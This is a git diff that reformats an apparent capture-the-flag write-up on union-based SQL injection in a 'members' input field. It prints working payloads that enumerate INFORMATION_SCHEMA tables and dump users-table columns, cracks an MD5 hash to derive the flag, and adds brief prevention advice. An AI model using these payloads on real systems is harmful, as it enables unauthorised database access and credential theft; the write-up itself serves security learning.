@@ -1,16 +1,20 @@
-### Title: <span style="color:blue">SQL Injection Vulnerability in Members Input Field</span>
+# SQL Injection Vulnerability in Members Input Field
 
 SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.
 
+# How We find it ?
+
 **Location:** `page=member`
 
-**Step 0:** 
+**Step 0:**
 
 write any string in the input field; this SQL error will be thrown.
+
 ```sql
 Unknown column 'test' in 'where clause'
 
 ```
+
 **Step 1:** try to write any basic SQL SELECT Statement in members input field as it is vulnerable to SQL injection
 
 **Result:**
@@ -54,13 +58,12 @@ We can use the `union-based` SQL injection technique to select more and more nul
 The UNION operator is used to combine the result sets of two or more SELECT statements.
 
 ```sql
-
 SELECT _column_name(s)_ FROM _table1_ UNION SELECT _column_name(s)_ FROM _table2_;
-Every SELECT statement within UNION must have the same number of columns.
-The columns must also have similar data types.
-The columns in every SELECT statement must also be in the same order. Syntax example:
-
 ```
+
+Every SELECT statement within UNION must have the same number of columns.
+
+Syntax example:
 
 ```sql
 
@@ -107,75 +110,83 @@ First name: vote_dbs
 Surname : BASE TABLE
 
 ```
+
 Here's a breakdown of what's happening:
-* The original query appears to be something like SELECT * FROM table WHERE ID = 74.
-* The injection starts with 74 or 1=1 which is always true (1=1), effectively bypassing any ID-based filtering in the original query.
-* Then, we perform a UNION with another SELECT statement that retrieves TABLE_NAME and TABLE_TYPE columns from the INFORMATION_SCHEMA.tables.
-* The retrieved table names `db_default`, `users`,` guestbook`, `list_images`,` vote_dbs`
-the value BASE TABLE in the TABLE_TYPE column indicates that the table is a regular, user-created table, not a view or a system table
+
+- The original query appears to be something like SELECT \* FROM table WHERE ID = 74.
+- The injection starts with 74 or 1=1 which is always true (1=1), effectively bypassing any ID-based filtering in the original query.
+- Then, we perform a UNION with another SELECT statement that retrieves TABLE_NAME and TABLE_TYPE columns from the INFORMATION_SCHEMA.tables.
+- The retrieved table names `db_default`, `users`,` guestbook`, `list_images`,` vote_dbs`
+  the value BASE TABLE in the TABLE_TYPE column indicates that the table is a regular, user-created table, not a view or a system table
 
 ```sql
  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 ```
 
-```sql 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+```sql
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : user_id
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : first_name
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : last_name
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : town
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : country
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : planet
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : Commentaire
 
-ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS 
+ID:  74 or 1=1 union select TABLE_NAME, COLUMN_NAME From INFORMATION_SCHEMA.COLUMNS
 First name: users
 Surname : countersign
 ....
 
 ```
+
 we tried :
-```sql 
+
+```sql
 74 or 1=1 union select user_id, first_name  from users
 74 or 1=1 union select last_name, town from users
 74 or 1=1 union select country, planet from users
 74 or 1=1 union select Commentaire, countersign from users
 
 ```
-After testing these series of SQL injection attempts, we observed that the flag appeared in the final query. In the query 
-```sql 
-74 or 1=1 union select Commentaire, countersign from users
-```
-the result shows : 
+
+After testing these series of SQL injection attempts, we observed that the flag appeared in the final query. In the query
 
 ```sql
-ID: 74 or 1=1 union select Commentaire, countersign from users 
+74 or 1=1 union select Commentaire, countersign from users
+```
+
+the result shows :
+
+```sql
+ID: 74 or 1=1 union select Commentaire, countersign from users
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 
 ```
+
 The instruction indicates that to verify this password, one should decrypt it, convert all characters to lowercase, and then apply the SHA256 hashing algorithm.
 the provided hash "5ff9d0165b4f92b14994e5c685cdce28" appears to be a 128-bit hexadecimal representation, which is often indicative of an MD5 hash.
-using : https://www.dcode.fr/identification-chiffrement to execute the instructions 
+using : https://www.dcode.fr/identification-chiffrement to execute the instructions
 
 decrypt MD5(5ff9d0165b4f92b14994e5c685cdce28) : FortyTwo
 lowercase the dycrepted value: fortytwo
@@ -183,21 +194,34 @@ sh256 of fortytwo value: 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925
 
 the flag is : 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5
 
+## How to Prevent ?
 
+To secure your application against SQL injection, implement the following measures:
 
+1. **Validate and Sanitize Inputs:**
+
+   - Restrict user input to expected formats using validation techniques.
+   - Use input sanitization libraries or frameworks to clean data.
+
+2. **Limit Database Permissions:**
+
+   - Use the principle of least privilege by restricting the database user to only the necessary permissions.
+
+3. **Monitor and Log Activities:**
+   - Implement monitoring tools to detect unusual database queries.
 
 **Resources:**
 
-information_shema: 
+information_shema:
 
-* https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.3/en/information-schema-introduction.html
+- https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.3/en/information-schema-introduction.html
 
-MySQL Injection: 
+MySQL Injection:
 
-* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
-* https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
-* https://portswigger.net/web-security/sql-injection
+- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
+- https://book.hacktricks.xyz/pentesting-web/sql-injection/mysql-injection
+- https://portswigger.net/web-security/sql-injection
 
-dCode: 
+dCode:
 
-* https://www.dcode.fr/identification-chiffrement
+- https://www.dcode.fr/identification-chiffrement
